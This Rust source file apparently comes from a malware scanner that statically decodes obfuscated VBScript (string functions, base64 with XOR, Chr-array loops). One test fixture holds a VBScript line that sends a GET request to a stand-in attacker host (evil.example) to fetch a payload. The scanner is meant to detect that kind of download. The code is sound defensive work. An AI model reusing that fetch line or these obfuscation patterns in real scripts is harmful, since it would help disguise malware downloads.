        let args = split_vbs_args(vbs_function_args(part, "left")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        return Some(value.chars().take(count).collect());
    }
    if lower.starts_with("right(") {
        let args = split_vbs_args(vbs_function_args(part, "right")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        let chars: Vec<char> = value.chars().collect();
        let start = chars.len().saturating_sub(count);
        return Some(chars.into_iter().skip(start).collect());
    }
    None
}

fn parse_vbs_split_index(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let trimmed = part.trim();
    let lower = trimmed.to_ascii_lowercase();
    if !lower.starts_with("split(") || !trimmed.ends_with(')') {
        return None;
    }
    let idx_start = trimmed.rfind(")(")?;
    let call = &trimmed[..idx_start + 1];
    let index = parse_vbs_integer(trimmed[idx_start + 2..trimmed.len() - 1].trim())? as usize;
    let inner = vbs_function_args(call, "split")?;
    let pieces = parse_vbs_split_values(inner, bindings, array_bindings)?;
    pieces.get(index).cloned()
}

fn parse_vbs_array_values(
    expr: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<Vec<String>> {
    let key = expr.trim().trim_matches(['(', ')']).to_ascii_lowercase();
    if let Some(values) = array_bindings.get(&key) {
        return Some(values.clone());
    }
    if let Some(inner) = vbs_function_args(expr, "split") {
        return parse_vbs_split_values(inner, bindings, array_bindings);
    }
    let inner = vbs_function_args(expr, "array")?;
    let mut values = Vec::new();
    for arg in split_vbs_args(inner) {
        if let Some(value) = eval_vbs_string_expr(arg, bindings, array_bindings) {
            values.push(value);
        } else {
            values.push(parse_vbs_integer(arg)?.to_string());
        }
    }
    Some(values)
}

fn bind_vbs_numeric_array_index(statement: &str, array_bindings: &mut VbsArrayBindings) -> bool {
    let Some(caps) = VBS_ARRAY_INDEX_ASSIGN_RE.captures(statement) else {
        return false;
    };
    let (Some(name), Some(index), Some(value)) = (caps.get(1), caps.get(2), caps.get(3)) else {
        return false;
    };
    let Ok(index) = index.as_str().parse::<usize>() else {
        return false;
    };
    let Some(value) = parse_vbs_integer(value.as_str()) else {
        return false;
    };
    let values = array_bindings
        .entry(name.as_str().to_ascii_lowercase())
        .or_default();
    if values.len() <= index {
        values.resize(index + 1, String::new());
    }
    values[index] = value.to_string();
    true
}

fn recover_vbs_nodetypedvalue_array_bindings(
    text: &str,
    bindings: &VbsStringBindings,
    array_bindings: &mut VbsArrayBindings,
) {
    const MAX_NODE_TYPED_B64_BYTES: usize = 1024 * 1024;

    let lines: Vec<&str> = text.lines().collect();
    let mut node_text: HashMap<String, String> = HashMap::new();
    let mut node_datatype: HashMap<String, String> = HashMap::new();
    for line in &lines {
        for statement in split_vbs_statements(line) {
            if let Some(caps) = VBS_NODE_TEXT_RE.captures(statement) {
                if let (Some(node), Some(expr)) = (caps.get(1), caps.get(2)) {
                    if let Some(value) =
                        eval_vbs_string_expr(expr.as_str(), bindings, array_bindings)
                    {
                        node_text.insert(node.as_str().to_ascii_lowercase(), value);
                    }
                }
                continue;
            }
            if let Some(caps) = VBS_NODE_DATATYPE_RE.captures(statement) {
                if let (Some(node), Some(expr)) = (caps.get(1), caps.get(2)) {
                    if let Some(value) =
                        eval_vbs_string_expr(expr.as_str(), bindings, array_bindings)
                    {
                        node_datatype.insert(node.as_str().to_ascii_lowercase(), value);
                    }
                }
            }
        }
    }

    for (line_idx, line) in lines.iter().enumerate() {
        let Some(caps) = VBS_NODE_TYPED_REDIM_RE.captures(line) else {
            continue;
        };
        let (Some(array), Some(node)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let array = array.as_str();
        let node_key = node.as_str().to_ascii_lowercase();
        if !node_datatype
            .get(&node_key)
            .is_some_and(|value| value.eq_ignore_ascii_case("bin.base64"))
        {
            continue;
        }
        let Some(encoded) = node_text.get(&node_key) else {
            continue;
        };
        if encoded.len() > MAX_NODE_TYPED_B64_BYTES {
            continue;
        }
        let Ok(mut decoded) = base64::engine::general_purpose::STANDARD.decode(encoded.as_bytes())
        else {
            continue;
        };
        if let Some(xor_key) = find_vbs_array_xor_key(&lines, line_idx, array, bindings) {
            for byte in &mut decoded {
                *byte ^= xor_key;
            }
        }
        array_bindings.insert(
            array.to_ascii_lowercase(),
            decoded.into_iter().map(|byte| byte.to_string()).collect(),
        );
    }
}

fn find_vbs_array_xor_key(
    lines: &[&str],
    start_idx: usize,
    array_name: &str,
    bindings: &VbsStringBindings,
) -> Option<u8> {
    lines.iter().skip(start_idx + 1).take(96).find_map(|line| {
        let caps = VBS_ARRAY_XOR_ASSIGN_RE.captures(line)?;
        let lhs_array = caps.get(1)?.as_str();
        let lhs_index = caps.get(2)?.as_str();
        let rhs_array = caps.get(3)?.as_str();
        let rhs_index = caps.get(4)?.as_str();
        if !lhs_array.eq_ignore_ascii_case(array_name)
            || !rhs_array.eq_ignore_ascii_case(array_name)
            || !lhs_index.eq_ignore_ascii_case(rhs_index)
        {
            return None;
        }
        let key_expr = caps.get(5)?.as_str().trim();
        let key = parse_vbs_integer(key_expr).or_else(|| {
            bindings
                .get(&key_expr.to_ascii_lowercase())
                .and_then(|value| parse_vbs_integer(value))
        })?;
        u8::try_from(key).ok()
    })
}

fn recover_vbs_chr_array_loop_bindings(
    text: &str,
    bindings: &mut VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) {
    let lines: Vec<&str> = text.lines().collect();
    for (line_idx, line) in lines.iter().enumerate() {
        let Some(for_caps) = VBS_FOR_UBOUND_RE.captures(line) else {
            continue;
        };
        let (Some(index_var), Some(array_var)) = (for_caps.get(1), for_caps.get(2)) else {
            continue;
        };
        let index_var = index_var.as_str();
        let array_var = array_var.as_str();
        let Some(values) = array_bindings.get(&array_var.to_ascii_lowercase()) else {
            continue;
        };
        let body_end = lines
            .iter()
            .enumerate()
            .skip(line_idx + 1)
            .take(32)
            .find_map(|(idx, candidate)| {
                candidate.trim().eq_ignore_ascii_case("Next").then_some(idx)
            })
            .unwrap_or_else(|| (line_idx + 1).saturating_add(32).min(lines.len()));
        for body_line in &lines[line_idx + 1..body_end] {
            let Some(body_caps) = VBS_CHR_ARRAY_APPEND_RE.captures(body_line) else {
                continue;
            };
            let (Some(output_lhs), Some(output_rhs), Some(body_array), Some(body_index)) = (
                body_caps.get(1),
                body_caps.get(2),
                body_caps.get(3),
                body_caps.get(4),
            ) else {
                continue;
            };
            if !output_lhs
                .as_str()
                .eq_ignore_ascii_case(output_rhs.as_str())
                || !body_array.as_str().eq_ignore_ascii_case(array_var)
                || !body_index.as_str().eq_ignore_ascii_case(index_var)
            {
                continue;
            }
            let xor_key = body_caps
                .get(5)
                .and_then(|value| parse_vbs_integer(value.as_str()));
            let mut decoded = String::new();
            let mut ok = true;
            for value in values {
                let Some(mut codepoint) = parse_vbs_integer(value) else {
                    ok = false;
                    break;
                };
                if let Some(key) = xor_key {
                    codepoint ^= key;
                }
                let Some(ch) = char::from_u32(codepoint) else {
                    ok = false;
                    break;
                };
                decoded.push(ch);
            }
            if ok {
                bindings.insert(output_lhs.as_str().to_ascii_lowercase(), decoded);
            }
        }
    }
}

fn parse_vbs_split_values(
    inner: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<Vec<String>> {
    let args = split_vbs_args(inner);
    if args.is_empty() {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let separator = if let Some(sep_expr) = args.get(1) {
        eval_vbs_string_expr(sep_expr, bindings, array_bindings)?
    } else {
        " ".to_string()
    };
    Some(if separator.is_empty() {
        source.chars().map(|c| c.to_string()).collect()
    } else {
        source.split(&separator).map(|s| s.to_string()).collect()
    })
}

fn parse_vbs_cstr(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "cstr")?;
    eval_vbs_string_expr(inner, bindings, array_bindings)
}

fn parse_vbs_eval(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "eval").or_else(|| vbs_function_args(part, "execute"))?;
    let expression = eval_vbs_string_expr(inner, bindings, array_bindings)?;
    eval_vbs_string_expr(&expression, bindings, array_bindings)
}

fn parse_vbs_replace(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "replace")?;
    let args = split_vbs_args(inner);
    if args.len() < 3 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let find = eval_vbs_string_expr(args[1], bindings, array_bindings)?;
    let replacement = eval_vbs_string_expr(args[2], bindings, array_bindings)?;
    if args
        .get(5)
        .is_some_and(|compare| vbs_replace_text_compare(compare))
    {
        Some(replace_ascii_case_insensitive(&source, &find, &replacement))
    } else {
        Some(source.replace(&find, &replacement))
    }
}

fn vbs_replace_text_compare(compare: &str) -> bool {
    let compare = compare.trim().trim_matches(['(', ')']);
    compare.eq_ignore_ascii_case("vbTextCompare") || compare == "1"
}

fn replace_ascii_case_insensitive(source: &str, find: &str, replacement: &str) -> String {
    if find.is_empty() {
        return source.to_string();
    }
    let source_lower = source.to_ascii_lowercase();
    let find_lower = find.to_ascii_lowercase();
    let mut out = String::with_capacity(source.len());
    let mut cursor = 0usize;
    while let Some(rel) = source_lower[cursor..].find(&find_lower) {
        let start = cursor + rel;
        out.push_str(&source[cursor..start]);
        out.push_str(replacement);
        cursor = start + find.len();
    }
    out.push_str(&source[cursor..]);
    out
}

fn parse_vbs_mid(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "mid")?;
    let args = split_vbs_args(inner);
    if args.len() < 2 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let start = parse_vbs_integer(args[1])? as usize;
    let skip = start.saturating_sub(1);
    let chars: Vec<char> = source.chars().collect();
    if skip >= chars.len() {
        return Some(String::new());
    }
    let take = args
        .get(2)
        .and_then(|arg| parse_vbs_integer(arg).map(|value| value as usize))
        .unwrap_or(chars.len() - skip);
    Some(chars.into_iter().skip(skip).take(take).collect())
}

fn vbs_function_args<'a>(part: &'a str, name: &str) -> Option<&'a str> {
    let part = part.trim();
    let lower = part.to_ascii_lowercase();
    let prefix_len = name.len();
    if !lower.starts_with(name) {
        return None;
    }
    let open = skip_ascii_ws(part, prefix_len);
    if part.as_bytes().get(open) != Some(&b'(') {
        return None;
    }
    let inner = part.get(open + 1..part.len().checked_sub(1)?)?;
    part.ends_with(')').then_some(inner)
}

fn skip_ascii_ws(text: &str, mut idx: usize) -> usize {
    while text
        .as_bytes()
        .get(idx)
        .is_some_and(u8::is_ascii_whitespace)
    {
        idx += 1;
    }
    idx
}

fn split_vbs_args(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b',' if !in_quote && paren_depth == 0 => {
                parts.push(expr[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(expr[start..].trim());
    parts
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    #[test]
    fn vbs_line_continuation_requires_space_before_underscore() {
        let text = "x = value_\ny = 1";
        assert_eq!(join_vbs_line_continuations(text), "x = value_\ny = 1\n");
    }

    #[test]
    fn vbs_line_continuation_ignores_underscore_inside_string() {
        let text = "x = \"http://literal.example/path_\"\ny = 1";
        assert_eq!(
            join_vbs_line_continuations(text),
            "x = \"http://literal.example/path_\"\ny = 1\n"
        );
    }

    #[test]
    fn vbs_line_continuation_ignores_space_underscore_inside_string() {
        let text = "x = \"http://literal.example/path _\"\ny = 1";
        assert_eq!(
            join_vbs_line_continuations(text),
            "x = \"http://literal.example/path _\"\ny = 1\n"
        );
    }

    #[test]
    fn vbs_line_continuation_joins_space_underscore_outside_string() {
        let text = "x = \"http://\" & _\n\"continued.example/p\"";
        assert_eq!(
            join_vbs_line_continuations(text),
            "x = \"http://\" & \"continued.example/p\"\n"
        );
    }

    #[test]
    fn vbs_scan_honors_expired_deadline() {
        let mut env = Environment::default();
        env.limits.deadline = Some(Instant::now() - Duration::from_secs(1));
        env.all_extracted_vbs
            .push(br#"x.Open "GET", "http://evil.example/p", False"#.to_vec());

        scan_vbs_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
            "no TimeoutHit emitted: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::Download { .. })),
            "deadline-expired scan still emitted Download: {:?}",
            env.traits
        );
        assert_eq!(
            env.all_extracted_vbs.len(),
            1,
            "deadline path dropped extracted VBS payloads"
        );
    }
}
